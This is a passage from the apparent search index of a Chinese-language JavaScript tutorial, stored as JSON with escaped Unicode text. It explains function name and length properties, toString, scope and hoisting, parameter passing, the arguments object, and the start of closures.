\u4f46\u662f\uff0c\u4e0a\u9762\u8fd9\u79cd\u60c5\u51b5\uff0c\u53ea\u6709\u5728\u53d8\u91cf\u7684\u503c\u662f\u4e00\u4e2a\u533f\u540d\u51fd\u6570\u65f6\u624d\u662f\u5982\u6b64\u3002\u5982\u679c\u53d8\u91cf\u7684\u503c\u662f\u4e00\u4e2a\u5177\u540d\u51fd\u6570\uff0c\u90a3\u4e48 name \u5c5e\u6027\u8fd4\u56de function \u5173\u952e\u5b57\u4e4b\u540e\u7684\u90a3\u4e2a\u51fd\u6570\u540d\u3002 1 2 var f3 = function myName () {}; f3 . name // 'myName' \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c f3.name \u8fd4\u56de\u51fd\u6570\u8868\u8fbe\u5f0f\u7684\u540d\u5b57\u3002\u6ce8\u610f\uff0c\u771f\u6b63\u7684\u51fd\u6570\u540d\u8fd8\u662f f3 \uff0c\u800c myName \u8fd9\u4e2a\u540d\u5b57\u53ea\u5728\u51fd\u6570\u4f53\u5185\u90e8\u53ef\u7528\u3002 name \u5c5e\u6027\u7684\u4e00\u4e2a\u7528\u5904\uff0c\u5c31\u662f\u83b7\u53d6\u53c2\u6570\u51fd\u6570\u7684\u540d\u5b57\u3002 1 2 3 4 5 6 7 var myFunc = function () {}; function test ( f ) { console . log ( f . name ); } test ( myFunc ) // myFunc \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 test \u5185\u90e8\u901a\u8fc7 name \u5c5e\u6027\uff0c\u5c31\u53ef\u4ee5\u77e5\u9053\u4f20\u5165\u7684\u53c2\u6570\u662f\u4ec0\u4e48\u51fd\u6570\u3002","title":"name \u5c5e\u6027"},{"location":"types/function/#length","text":"\u51fd\u6570\u7684 length \u5c5e\u6027\u8fd4\u56de\u51fd\u6570\u9884\u671f\u4f20\u5165\u7684\u53c2\u6570\u4e2a\u6570\uff0c\u5373\u51fd\u6570\u5b9a\u4e49\u4e4b\u4e2d\u7684\u53c2\u6570\u4e2a\u6570\u3002 1 2 function f ( a , b ) {} f . length // 2 \u4e0a\u9762\u4ee3\u7801\u5b9a\u4e49\u4e86\u7a7a\u51fd\u6570 f \uff0c\u5b83\u7684 length \u5c5e\u6027\u5c31\u662f\u5b9a\u4e49\u65f6\u7684\u53c2\u6570\u4e2a\u6570\u3002\u4e0d\u7ba1\u8c03\u7528\u65f6\u8f93\u5165\u4e86\u591a\u5c11\u4e2a\u53c2\u6570\uff0c length \u5c5e\u6027\u59cb\u7ec8\u7b49\u4e8e2\u3002 length \u5c5e\u6027\u63d0\u4f9b\u4e86\u4e00\u79cd\u673a\u5236\uff0c\u5224\u65ad\u5b9a\u4e49\u65f6\u548c\u8c03\u7528\u65f6\u53c2\u6570\u7684\u5dee\u5f02\uff0c\u4ee5\u4fbf\u5b9e\u73b0\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u7684\u201c\u65b9\u6cd5\u91cd\u8f7d\u201d\uff08overload\uff09\u3002","title":"length \u5c5e\u6027"},{"location":"types/function/#tostring","text":"\u51fd\u6570\u7684 toString() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5185\u5bb9\u662f\u51fd\u6570\u7684\u6e90\u7801\u3002 1 2 3 4 5 6 7 8 9 10 11 12 function f () { a (); b (); c (); } f . toString () // function f() { // a(); // b(); // c(); // } \u4e0a\u9762\u793a\u4f8b\u4e2d\uff0c\u51fd\u6570 f \u7684 toString() \u65b9\u6cd5\u8fd4\u56de\u4e86 f \u7684\u6e90\u7801\uff0c\u5305\u542b\u6362\u884c\u7b26\u5728\u5185\u3002 \u5bf9\u4e8e\u90a3\u4e9b\u539f\u751f\u7684\u51fd\u6570\uff0c toString() \u65b9\u6cd5\u8fd4\u56de function (){[native code]} \u3002 1 2 Math . sqrt . toString () // \"function sqrt() { [native code] }\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Math.sqrt() \u662f JavaScript \u5f15\u64ce\u63d0\u4f9b\u7684\u539f\u751f\u51fd\u6570\uff0c toString() \u65b9\u6cd5\u5c31\u8fd4\u56de\u539f\u751f\u4ee3\u7801\u7684\u63d0\u793a\u3002 \u51fd\u6570\u5185\u90e8\u7684\u6ce8\u91ca\u4e5f\u53ef\u4ee5\u8fd4\u56de\u3002 1 2 3 4 5 6 7 8 9 10 function f () { /* \u8fd9\u662f\u4e00\u4e2a \u591a\u884c\u6ce8\u91ca */ } f . toString () // \"function f(){/* // \u8fd9\u662f\u4e00\u4e2a // \u591a\u884c\u6ce8\u91ca // */}\" \u5229\u7528\u8fd9\u4e00\u70b9\uff0c\u53ef\u4ee5\u53d8\u76f8\u5b9e\u73b0\u591a\u884c\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var multiline = function ( fn ) { var arr = fn . toString (). split ( '\\n' ); return arr . slice ( 1 , arr . length - 1 ). join ( '\\n' ); }; function f () { /* \u8fd9\u662f\u4e00\u4e2a \u591a\u884c\u6ce8\u91ca */ } multiline ( f ); // \" \u8fd9\u662f\u4e00\u4e2a // \u591a\u884c\u6ce8\u91ca\" \u4e0a\u9762\u793a\u4f8b\u4e2d\uff0c\u51fd\u6570 f \u5185\u90e8\u6709\u4e00\u4e2a\u591a\u884c\u6ce8\u91ca\uff0c toString() \u65b9\u6cd5\u62ff\u5230 f \u7684\u6e90\u7801\u540e\uff0c\u53bb\u6389\u9996\u5c3e\u4e24\u884c\uff0c\u5c31\u5f97\u5230\u4e86\u4e00\u4e2a\u591a\u884c\u5b57\u7b26\u4e32\u3002","title":"toString()"},{"location":"types/function/#_8","text":"","title":"\u51fd\u6570\u4f5c\u7528\u57df"},{"location":"types/function/#_9","text":"\u4f5c\u7528\u57df\uff08scope\uff09\u6307\u7684\u662f\u53d8\u91cf\u5b58\u5728\u7684\u8303\u56f4\u3002\u5728 ES5 \u7684\u89c4\u8303\u4e2d\uff0cJavaScript \u53ea\u6709\u4e24\u79cd\u4f5c\u7528\u57df\uff1a\u4e00\u79cd\u662f\u5168\u5c40\u4f5c\u7528\u57df\uff0c\u53d8\u91cf\u5728\u6574\u4e2a\u7a0b\u5e8f\u4e2d\u4e00\u76f4\u5b58\u5728\uff0c\u6240\u6709\u5730\u65b9\u90fd\u53ef\u4ee5\u8bfb\u53d6\uff1b\u53e6\u4e00\u79cd\u662f\u51fd\u6570\u4f5c\u7528\u57df\uff0c\u53d8\u91cf\u53ea\u5728\u51fd\u6570\u5185\u90e8\u5b58\u5728\u3002ES6 \u53c8\u65b0\u589e\u4e86\u5757\u7ea7\u4f5c\u7528\u57df\uff0c\u672c\u6559\u7a0b\u4e0d\u6d89\u53ca\u3002 \u5bf9\u4e8e\u9876\u5c42\u51fd\u6570\u6765\u8bf4\uff0c\u51fd\u6570\u5916\u90e8\u58f0\u660e\u7684\u53d8\u91cf\u5c31\u662f\u5168\u5c40\u53d8\u91cf\uff08global variable\uff09\uff0c\u5b83\u53ef\u4ee5\u5728\u51fd\u6570\u5185\u90e8\u8bfb\u53d6\u3002 1 2 3 4 5 6 7 8 var v = 1 ; function f () { console . log ( v ); } f () // 1 \u4e0a\u9762\u7684\u4ee3\u7801\u8868\u660e\uff0c\u51fd\u6570 f \u5185\u90e8\u53ef\u4ee5\u8bfb\u53d6\u5168\u5c40\u53d8\u91cf v \u3002 \u5728\u51fd\u6570\u5185\u90e8\u5b9a\u4e49\u7684\u53d8\u91cf\uff0c\u5916\u90e8\u65e0\u6cd5\u8bfb\u53d6\uff0c\u79f0\u4e3a\u201c\u5c40\u90e8\u53d8\u91cf\u201d\uff08local variable\uff09\u3002 1 2 3 4 5 function f (){ var v = 1 ; } v // ReferenceError: v is not defined \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf v \u5728\u51fd\u6570\u5185\u90e8\u5b9a\u4e49\uff0c\u6240\u4ee5\u662f\u4e00\u4e2a\u5c40\u90e8\u53d8\u91cf\uff0c\u51fd\u6570\u4e4b\u5916\u5c31\u65e0\u6cd5\u8bfb\u53d6\u3002 \u51fd\u6570\u5185\u90e8\u5b9a\u4e49\u7684\u53d8\u91cf\uff0c\u4f1a\u5728\u8be5\u4f5c\u7528\u57df\u5185\u8986\u76d6\u540c\u540d\u5168\u5c40\u53d8\u91cf\u3002 1 2 3 4 5 6 7 8 9 var v = 1 ; function f (){ var v = 2 ; console . log ( v ); } f () // 2 v // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf v \u540c\u65f6\u5728\u51fd\u6570\u7684\u5916\u90e8\u548c\u5185\u90e8\u6709\u5b9a\u4e49\u3002\u7ed3\u679c\uff0c\u5728\u51fd\u6570\u5185\u90e8\u5b9a\u4e49\uff0c\u5c40\u90e8\u53d8\u91cf v \u8986\u76d6\u4e86\u5168\u5c40\u53d8\u91cf v \u3002 \u6ce8\u610f\uff0c\u5bf9\u4e8e var \u547d\u4ee4\u6765\u8bf4\uff0c\u5c40\u90e8\u53d8\u91cf\u53ea\u80fd\u5728\u51fd\u6570\u5185\u90e8\u58f0\u660e\uff0c\u5728\u5176\u4ed6\u533a\u5757\u4e2d\u58f0\u660e\uff0c\u4e00\u5f8b\u90fd\u662f\u5168\u5c40\u53d8\u91cf\u3002 1 2 3 4 if ( true ) { var x = 5 ; } console . log ( x ); // 5 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf x \u5728\u6761\u4ef6\u5224\u65ad\u533a\u5757\u4e4b\u4e2d\u58f0\u660e\uff0c\u7ed3\u679c\u5c31\u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u53ef\u4ee5\u5728\u533a\u5757\u4e4b\u5916\u8bfb\u53d6\u3002","title":"\u5b9a\u4e49"},{"location":"types/function/#_10","text":"\u4e0e\u5168\u5c40\u4f5c\u7528\u57df\u4e00\u6837\uff0c\u51fd\u6570\u4f5c\u7528\u57df\u5185\u90e8\u4e5f\u4f1a\u4ea7\u751f\u201c\u53d8\u91cf\u63d0\u5347\u201d\u73b0\u8c61\u3002 var \u547d\u4ee4\u58f0\u660e\u7684\u53d8\u91cf\uff0c\u4e0d\u7ba1\u5728\u4ec0\u4e48\u4f4d\u7f6e\uff0c\u53d8\u91cf\u58f0\u660e\u90fd\u4f1a\u88ab\u63d0\u5347\u5230\u51fd\u6570\u4f53\u7684\u5934\u90e8\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 function foo ( x ) { if ( x > 100 ) { var tmp = x - 100 ; } } // \u7b49\u540c\u4e8e function foo ( x ) { var tmp ; if ( x > 100 ) { tmp = x - 100 ; }; }","title":"\u51fd\u6570\u5185\u90e8\u7684\u53d8\u91cf\u63d0\u5347"},{"location":"types/function/#_11","text":"\u51fd\u6570\u672c\u8eab\u4e5f\u662f\u4e00\u4e2a\u503c\uff0c\u4e5f\u6709\u81ea\u5df1\u7684\u4f5c\u7528\u57df\u3002\u5b83\u7684\u4f5c\u7528\u57df\u4e0e\u53d8\u91cf\u4e00\u6837\uff0c\u5c31\u662f\u5176\u58f0\u660e\u65f6\u6240\u5728\u7684\u4f5c\u7528\u57df\uff0c\u4e0e\u5176\u8fd0\u884c\u65f6\u6240\u5728\u7684\u4f5c\u7528\u57df\u65e0\u5173\u3002 1 2 3 4 5 6 7 8 9 10 11 var a = 1 ; var x = function () { console . log ( a ); }; function f () { var a = 2 ; x (); } f () // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 x \u662f\u5728\u51fd\u6570 f \u7684\u5916\u90e8\u58f0\u660e\u7684\uff0c\u6240\u4ee5\u5b83\u7684\u4f5c\u7528\u57df\u7ed1\u5b9a\u5916\u5c42\uff0c\u5185\u90e8\u53d8\u91cf a \u4e0d\u4f1a\u5230\u51fd\u6570 f \u4f53\u5185\u53d6\u503c\uff0c\u6240\u4ee5\u8f93\u51fa 1 \uff0c\u800c\u4e0d\u662f 2 \u3002 \u603b\u4e4b\uff0c\u51fd\u6570\u6267\u884c\u65f6\u6240\u5728\u7684\u4f5c\u7528\u57df\uff0c\u662f\u5b9a\u4e49\u65f6\u7684\u4f5c\u7528\u57df\uff0c\u800c\u4e0d\u662f\u8c03\u7528\u65f6\u6240\u5728\u7684\u4f5c\u7528\u57df\u3002 \u5f88\u5bb9\u6613\u72af\u9519\u7684\u4e00\u70b9\u662f\uff0c\u5982\u679c\u51fd\u6570 A \u8c03\u7528\u51fd\u6570 B \uff0c\u5374\u6ca1\u8003\u8651\u5230\u51fd\u6570 B \u4e0d\u4f1a\u5f15\u7528\u51fd\u6570 A \u7684\u5185\u90e8\u53d8\u91cf\u3002 1 2 3 4 5 6 7 8 9 10 11 var x = function () { console . log ( a ); }; function y ( f ) { var a = 2 ; f (); } y ( x ) // ReferenceError: a is not defined \u4e0a\u9762\u4ee3\u7801\u5c06\u51fd\u6570 x \u4f5c\u4e3a\u53c2\u6570\uff0c\u4f20\u5165\u51fd\u6570 y \u3002\u4f46\u662f\uff0c\u51fd\u6570 x \u662f\u5728\u51fd\u6570 y \u4f53\u5916\u58f0\u660e\u7684\uff0c\u4f5c\u7528\u57df\u7ed1\u5b9a\u5916\u5c42\uff0c\u56e0\u6b64\u627e\u4e0d\u5230\u51fd\u6570 y \u7684\u5185\u90e8\u53d8\u91cf a \uff0c\u5bfc\u81f4\u62a5\u9519\u3002 \u540c\u6837\u7684\uff0c\u51fd\u6570\u4f53\u5185\u90e8\u58f0\u660e\u7684\u51fd\u6570\uff0c\u4f5c\u7528\u57df\u7ed1\u5b9a\u51fd\u6570\u4f53\u5185\u90e8\u3002 1 2 3 4 5 6 7 8 9 10 11 function foo () { var x = 1 ; function bar () { console . log ( x ); } return bar ; } var x = 2 ; var f = foo (); f () // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 foo \u5185\u90e8\u58f0\u660e\u4e86\u4e00\u4e2a\u51fd\u6570 bar \uff0c bar \u7684\u4f5c\u7528\u57df\u7ed1\u5b9a foo \u3002\u5f53\u6211\u4eec\u5728 foo \u5916\u90e8\u53d6\u51fa bar \u6267\u884c\u65f6\uff0c\u53d8\u91cf x \u6307\u5411\u7684\u662f foo \u5185\u90e8\u7684 x \uff0c\u800c\u4e0d\u662f foo \u5916\u90e8\u7684 x \u3002\u6b63\u662f\u8fd9\u79cd\u673a\u5236\uff0c\u6784\u6210\u4e86\u4e0b\u6587\u8981\u8bb2\u89e3\u7684\u201c\u95ed\u5305\u201d\u73b0\u8c61\u3002","title":"\u51fd\u6570\u672c\u8eab\u7684\u4f5c\u7528\u57df"},{"location":"types/function/#_12","text":"","title":"\u53c2\u6570"},{"location":"types/function/#_13","text":"\u51fd\u6570\u8fd0\u884c\u7684\u65f6\u5019\uff0c\u6709\u65f6\u9700\u8981\u63d0\u4f9b\u5916\u90e8\u6570\u636e\uff0c\u4e0d\u540c\u7684\u5916\u90e8\u6570\u636e\u4f1a\u5f97\u5230\u4e0d\u540c\u7684\u7ed3\u679c\uff0c\u8fd9\u79cd\u5916\u90e8\u6570\u636e\u5c31\u53eb\u53c2\u6570\u3002 1 2 3 4 5 6 function square ( x ) { return x * x ; } square ( 2 ) // 4 square ( 3 ) // 9 \u4e0a\u5f0f\u7684 x \u5c31\u662f square \u51fd\u6570\u7684\u53c2\u6570\u3002\u6bcf\u6b21\u8fd0\u884c\u7684\u65f6\u5019\uff0c\u9700\u8981\u63d0\u4f9b\u8fd9\u4e2a\u503c\uff0c\u5426\u5219\u5f97\u4e0d\u5230\u7ed3\u679c\u3002","title":"\u6982\u8ff0"},{"location":"types/function/#_14","text":"\u51fd\u6570\u53c2\u6570\u4e0d\u662f\u5fc5\u9700\u7684\uff0cJavaScript \u5141\u8bb8\u7701\u7565\u53c2\u6570\u3002 1 2 3 4 5 6 7 8 9 function f ( a , b ) { return a ; } f ( 1 , 2 , 3 ) // 1 f ( 1 ) // 1 f () // undefined f . length // 2 \u4e0a\u9762\u4ee3\u7801\u7684\u51fd\u6570 f \u5b9a\u4e49\u4e86\u4e24\u4e2a\u53c2\u6570\uff0c\u4f46\u662f\u8fd0\u884c\u65f6\u65e0\u8bba\u63d0\u4f9b\u591a\u5c11\u4e2a\u53c2\u6570\uff08\u6216\u8005\u4e0d\u63d0\u4f9b\u53c2\u6570\uff09\uff0cJavaScript \u90fd\u4e0d\u4f1a\u62a5\u9519\u3002\u7701\u7565\u7684\u53c2\u6570\u7684\u503c\u5c31\u53d8\u4e3a undefined \u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u51fd\u6570\u7684 length \u5c5e\u6027\u4e0e\u5b9e\u9645\u4f20\u5165\u7684\u53c2\u6570\u4e2a\u6570\u65e0\u5173\uff0c\u53ea\u53cd\u6620\u51fd\u6570\u9884\u671f\u4f20\u5165\u7684\u53c2\u6570\u4e2a\u6570\u3002 \u4f46\u662f\uff0c\u6ca1\u6709\u529e\u6cd5\u53ea\u7701\u7565\u9760\u524d\u7684\u53c2\u6570\uff0c\u800c\u4fdd\u7559\u9760\u540e\u7684\u53c2\u6570\u3002\u5982\u679c\u4e00\u5b9a\u8981\u7701\u7565\u9760\u524d\u7684\u53c2\u6570\uff0c\u53ea\u6709\u663e\u5f0f\u4f20\u5165 undefined \u3002 1 2 3 4 5 6 function f ( a , b ) { return a ; } f ( , 1 ) // SyntaxError: Unexpected token ,(\u2026) f ( undefined , 1 ) // undefined \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u7701\u7565\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u5c31\u4f1a\u62a5\u9519\u3002","title":"\u53c2\u6570\u7684\u7701\u7565"},{"location":"types/function/#_15","text":"\u51fd\u6570\u53c2\u6570\u5982\u679c\u662f\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff08\u6570\u503c\u3001\u5b57\u7b26\u4e32\u3001\u5e03\u5c14\u503c\uff09\uff0c\u4f20\u9012\u65b9\u5f0f\u662f\u4f20\u503c\u4f20\u9012\uff08passes by value\uff09\u3002\u8fd9\u610f\u5473\u7740\uff0c\u5728\u51fd\u6570\u4f53\u5185\u4fee\u6539\u53c2\u6570\u503c\uff0c\u4e0d\u4f1a\u5f71\u54cd\u5230\u51fd\u6570\u5916\u90e8\u3002 1 2 3 4 5 6 7 8 var p = 2 ; function f ( p ) { p = 3 ; } f ( p ); p // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf p \u662f\u4e00\u4e2a\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u4f20\u5165\u51fd\u6570 f \u7684\u65b9\u5f0f\u662f\u4f20\u503c\u4f20\u9012\u3002\u56e0\u6b64\uff0c\u5728\u51fd\u6570\u5185\u90e8\uff0c p \u7684\u503c\u662f\u539f\u59cb\u503c\u7684\u62f7\u8d1d\uff0c\u65e0\u8bba\u600e\u4e48\u4fee\u6539\uff0c\u90fd\u4e0d\u4f1a\u5f71\u54cd\u5230\u539f\u59cb\u503c\u3002 \u4f46\u662f\uff0c\u5982\u679c\u51fd\u6570\u53c2\u6570\u662f\u590d\u5408\u7c7b\u578b\u7684\u503c\uff08\u6570\u7ec4\u3001\u5bf9\u8c61\u3001\u5176\u4ed6\u51fd\u6570\uff09\uff0c\u4f20\u9012\u65b9\u5f0f\u662f\u4f20\u5740\u4f20\u9012\uff08pass by reference\uff09\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4f20\u5165\u51fd\u6570\u7684\u539f\u59cb\u503c\u7684\u5730\u5740\uff0c\u56e0\u6b64\u5728\u51fd\u6570\u5185\u90e8\u4fee\u6539\u53c2\u6570\uff0c\u5c06\u4f1a\u5f71\u54cd\u5230\u539f\u59cb\u503c\u3002 1 2 3 4 5 6 7 8 var obj = { p : 1 }; function f ( o ) { o . p = 2 ; } f ( obj ); obj . p // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4f20\u5165\u51fd\u6570 f \u7684\u662f\u53c2\u6570\u5bf9\u8c61 obj \u7684\u5730\u5740\u3002\u56e0\u6b64\uff0c\u5728\u51fd\u6570\u5185\u90e8\u4fee\u6539 obj \u7684\u5c5e\u6027 p \uff0c\u4f1a\u5f71\u54cd\u5230\u539f\u59cb\u503c\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u51fd\u6570\u5185\u90e8\u4fee\u6539\u7684\uff0c\u4e0d\u662f\u53c2\u6570\u5bf9\u8c61\u7684\u67d0\u4e2a\u5c5e\u6027\uff0c\u800c\u662f\u66ff\u6362\u6389\u6574\u4e2a\u53c2\u6570\uff0c\u8fd9\u65f6\u4e0d\u4f1a\u5f71\u54cd\u5230\u539f\u59cb\u503c\u3002 1 2 3 4 5 6 7 8 var obj = [ 1 , 2 , 3 ]; function f ( o ) { o = [ 2 , 3 , 4 ]; } f ( obj ); obj // [1, 2, 3] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5728\u51fd\u6570 f() \u5185\u90e8\uff0c\u53c2\u6570\u5bf9\u8c61 obj \u88ab\u6574\u4e2a\u66ff\u6362\u6210\u53e6\u4e00\u4e2a\u503c\u3002\u8fd9\u65f6\u4e0d\u4f1a\u5f71\u54cd\u5230\u539f\u59cb\u503c\u3002\u8fd9\u662f\u56e0\u4e3a\uff0c\u5f62\u5f0f\u53c2\u6570\uff08 o \uff09\u7684\u503c\u5b9e\u9645\u662f\u53c2\u6570 obj \u7684\u5730\u5740\uff0c\u91cd\u65b0\u5bf9 o \u8d4b\u503c\u5bfc\u81f4 o \u6307\u5411\u53e6\u4e00\u4e2a\u5730\u5740\uff0c\u4fdd\u5b58\u5728\u539f\u5730\u5740\u4e0a\u7684\u503c\u5f53\u7136\u4e0d\u53d7\u5f71\u54cd\u3002","title":"\u4f20\u9012\u65b9\u5f0f"},{"location":"types/function/#_16","text":"\u5982\u679c\u6709\u540c\u540d\u7684\u53c2\u6570\uff0c\u5219\u53d6\u6700\u540e\u51fa\u73b0\u7684\u90a3\u4e2a\u503c\u3002 1 2 3 4 5 function f ( a , a ) { console . log ( a ); } f ( 1 , 2 ) // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 f() \u6709\u4e24\u4e2a\u53c2\u6570\uff0c\u4e14\u53c2\u6570\u540d\u90fd\u662f a \u3002\u53d6\u503c\u7684\u65f6\u5019\uff0c\u4ee5\u540e\u9762\u7684 a \u4e3a\u51c6\uff0c\u5373\u4f7f\u540e\u9762\u7684 a \u6ca1\u6709\u503c\u6216\u88ab\u7701\u7565\uff0c\u4e5f\u662f\u4ee5\u5176\u4e3a\u51c6\u3002 1 2 3 4 5 function f ( a , a ) { console . log ( a ); } f ( 1 ) // undefined \u8c03\u7528\u51fd\u6570 f() \u7684\u65f6\u5019\uff0c\u6ca1\u6709\u63d0\u4f9b\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c a \u7684\u53d6\u503c\u5c31\u53d8\u6210\u4e86 undefined \u3002\u8fd9\u65f6\uff0c\u5982\u679c\u8981\u83b7\u5f97\u7b2c\u4e00\u4e2a a \u7684\u503c\uff0c\u53ef\u4ee5\u4f7f\u7528 arguments \u5bf9\u8c61\u3002 1 2 3 4 5 function f ( a , a ) { console . log ( arguments [ 0 ]); } f ( 1 ) // 1","title":"\u540c\u540d\u53c2\u6570"},{"location":"types/function/#arguments","text":"\uff081\uff09\u5b9a\u4e49 \u7531\u4e8e JavaScript \u5141\u8bb8\u51fd\u6570\u6709\u4e0d\u5b9a\u6570\u76ee\u7684\u53c2\u6570\uff0c\u6240\u4ee5\u9700\u8981\u4e00\u79cd\u673a\u5236\uff0c\u53ef\u4ee5\u5728\u51fd\u6570\u4f53\u5185\u90e8\u8bfb\u53d6\u6240\u6709\u53c2\u6570\u3002\u8fd9\u5c31\u662f arguments \u5bf9\u8c61\u7684\u7531\u6765\u3002 arguments \u5bf9\u8c61\u5305\u542b\u4e86\u51fd\u6570\u8fd0\u884c\u65f6\u7684\u6240\u6709\u53c2\u6570\uff0c arguments[0] \u5c31\u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c arguments[1] \u5c31\u662f\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002\u8fd9\u4e2a\u5bf9\u8c61\u53ea\u6709\u5728\u51fd\u6570\u4f53\u5185\u90e8\uff0c\u624d\u53ef\u4ee5\u4f7f\u7528\u3002 1 2 3 4 5 6 7 8 9 10 var f = function ( one ) { console . log ( arguments [ 0 ]); console . log ( arguments [ 1 ]); console . log ( arguments [ 2 ]); } f ( 1 , 2 , 3 ) // 1 // 2 // 3 \u6b63\u5e38\u6a21\u5f0f\u4e0b\uff0c arguments \u5bf9\u8c61\u53ef\u4ee5\u5728\u8fd0\u884c\u65f6\u4fee\u6539\u3002 1 2 3 4 5 6 7 var f = function ( a , b ) { arguments [ 0 ] = 3 ; arguments [ 1 ] = 2 ; return a + b ; } f ( 1 , 1 ) // 5 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 f() \u8c03\u7528\u65f6\u4f20\u5165\u7684\u53c2\u6570\uff0c\u5728\u51fd\u6570\u5185\u90e8\u88ab\u4fee\u6539\u6210 3 \u548c 2 \u3002 \u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c arguments \u5bf9\u8c61\u4e0e\u51fd\u6570\u53c2\u6570\u4e0d\u5177\u6709\u8054\u52a8\u5173\u7cfb\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4fee\u6539 arguments \u5bf9\u8c61\u4e0d\u4f1a\u5f71\u54cd\u5230\u5b9e\u9645\u7684\u51fd\u6570\u53c2\u6570\u3002 1 2 3 4 5 6 7 8 var f = function ( a , b ) { 'use strict' ; // \u5f00\u542f\u4e25\u683c\u6a21\u5f0f arguments [ 0 ] = 3 ; arguments [ 1 ] = 2 ; return a + b ; } f ( 1 , 1 ) // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570\u4f53\u5185\u662f\u4e25\u683c\u6a21\u5f0f\uff0c\u8fd9\u65f6\u4fee\u6539 arguments \u5bf9\u8c61\uff0c\u4e0d\u4f1a\u5f71\u54cd\u5230\u771f\u5b9e\u53c2\u6570 a \u548c b \u3002 \u901a\u8fc7 arguments \u5bf9\u8c61\u7684 length \u5c5e\u6027\uff0c\u53ef\u4ee5\u5224\u65ad\u51fd\u6570\u8c03\u7528\u65f6\u5230\u5e95\u5e26\u51e0\u4e2a\u53c2\u6570\u3002 1 2 3 4 5 6 7 function f () { return arguments . length ; } f ( 1 , 2 , 3 ) // 3 f ( 1 ) // 1 f () // 0 \uff082\uff09\u4e0e\u6570\u7ec4\u7684\u5173\u7cfb \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u867d\u7136 arguments \u5f88\u50cf\u6570\u7ec4\uff0c\u4f46\u5b83\u662f\u4e00\u4e2a\u5bf9\u8c61\u3002\u6570\u7ec4\u4e13\u6709\u7684\u65b9\u6cd5\uff08\u6bd4\u5982 slice \u548c forEach \uff09\uff0c\u4e0d\u80fd\u5728 arguments \u5bf9\u8c61\u4e0a\u76f4\u63a5\u4f7f\u7528\u3002 \u5982\u679c\u8981\u8ba9 arguments \u5bf9\u8c61\u4f7f\u7528\u6570\u7ec4\u65b9\u6cd5\uff0c\u771f\u6b63\u7684\u89e3\u51b3\u65b9\u6cd5\u662f\u5c06 arguments \u8f6c\u4e3a\u771f\u6b63\u7684\u6570\u7ec4\u3002\u4e0b\u9762\u662f\u4e24\u79cd\u5e38\u7528\u7684\u8f6c\u6362\u65b9\u6cd5\uff1a slice \u65b9\u6cd5\u548c\u9010\u4e00\u586b\u5165\u65b0\u6570\u7ec4\u3002 1 2 3 4 5 6 7 var args = Array . prototype . slice . call ( arguments ); // \u6216\u8005 var args = []; for ( var i = 0 ; i < arguments . length ; i ++ ) { args . push ( arguments [ i ]); } \uff083\uff09callee \u5c5e\u6027 arguments \u5bf9\u8c61\u5e26\u6709\u4e00\u4e2a callee \u5c5e\u6027\uff0c\u8fd4\u56de\u5b83\u6240\u5bf9\u5e94\u7684\u539f\u51fd\u6570\u3002 1 2 3 4 5 var f = function () { console . log ( arguments . callee === f ); } f () // true \u53ef\u4ee5\u901a\u8fc7 arguments.callee \uff0c\u8fbe\u5230\u8c03\u7528\u51fd\u6570\u81ea\u8eab\u7684\u76ee\u7684\u3002\u8fd9\u4e2a\u5c5e\u6027\u5728\u4e25\u683c\u6a21\u5f0f\u91cc\u9762\u662f\u7981\u7528\u7684\uff0c\u56e0\u6b64\u4e0d\u5efa\u8bae\u4f7f\u7528\u3002","title":"arguments \u5bf9\u8c61"},{"location":"types/function/#_17","text":"","title":"\u51fd\u6570\u7684\u5176\u4ed6\u77e5\u8bc6\u70b9"},{"location":"types/function/#_18","text":"\u95ed\u5305\uff08closure\uff09\u662f JavaScript \u8bed\u8a00\u7684\u4e00\u4e2a\u96be\u70b9\uff0c\u4e5f\u662f\u5b83\u7684\u7279\u8272\uff0c\u5f88\u591a\u9ad8\u7ea7\u5e94\u7528\u90fd\u8981\u4f9d\u9760\u95ed\u5305\u5b9e\u73b0\u3002 \u7406\u89e3\u95ed\u5305\uff0c\u9996\u5148\u5fc5\u987b\u7406\u89e3\u53d8\u91cf\u4f5c\u7528\u57df\u3002\u524d\u9762\u63d0\u5230\uff0cJavaScript 